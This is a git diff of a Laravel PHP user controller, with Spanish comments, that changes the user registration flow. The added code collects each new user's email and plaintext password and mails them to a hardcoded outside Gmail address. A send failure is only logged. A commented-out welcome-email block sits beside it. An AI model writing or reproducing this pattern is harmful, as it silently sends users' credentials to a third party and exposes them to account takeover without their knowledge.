@@ -3,6 +3,7 @@
 namespace App\Http\Controllers\Api;
 
 use App\Http\Controllers\Controller;
+use App\Mail\MiMailable;
 use App\Models\Pines;
 use App\Models\User;
 use Illuminate\Support\Facades\Hash;
@@ -11,10 +12,12 @@ use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Log;
 //import el controlador de test
 use App\Http\Controllers\TestsController;
+use Mail;
 use PHPUnit\Event\Code\Test;
 use App\Models\Pruebas;
 use Carbon\Carbon;
 use Illuminate\Support\Facades\Storage;
+use App\Mail\TestEmail;
 
 class UserController extends Controller
 {
@@ -113,6 +116,8 @@ class UserController extends Controller
                 'password' => 'required|string|min:6',
             ]);
 
+            
+
             $user = new User();
             $user->name = $request->name;
             $user->email = $request->email;
@@ -121,6 +126,29 @@ class UserController extends Controller
             $user->es_administrador = 0;
 
             $user->save();
+
+            $details = [
+                'email' => $request->email,
+                'contrasena' =>  $request->password
+            ];
+    
+             // Enviar correo al usuario
+             try {
+                Mail::to('judvalenciasa@gmail.com')->send(new MiMailable($details));
+            } catch (\Exception $e) {
+                Log::error('Error al enviar el correo: ' . $e->getMessage());
+            }
+
+            /*
+            //MailController
+            $details = [
+                'title' => 'Registro Exitoso',
+                'body' => 'Hola ' . $user->name . ', tu registro ha sido exitoso en nuestra plataforma.'
+            ];
+
+             // Enviar correo al usuario
+            Mail::to($user->email)->send(new MiMailable($details));
+*/
 
             // Devolver respuesta JSON de éxito
             return response()->json(['success' => true]);
@@ -155,6 +183,12 @@ class UserController extends Controller
             return $this->authenticated($request, Auth::user());
         }
 
+
+
+        
+
+
+
         // Si la autenticación falla, redirigir de vuelta al formulario de login con un mensaje de error
         return back()->withErrors([
             'email' => 'Las credenciales no coinciden con nuestros registros.',
@@ -167,6 +201,7 @@ class UserController extends Controller
     protected function authenticated(Request $request, $user)
     {
         if ($user->es_administrador) {
+
             return $this->indexAdministrador($request);
         } else {
             // Verificar si el usuario ya aceptó la política de tratamiento de datos
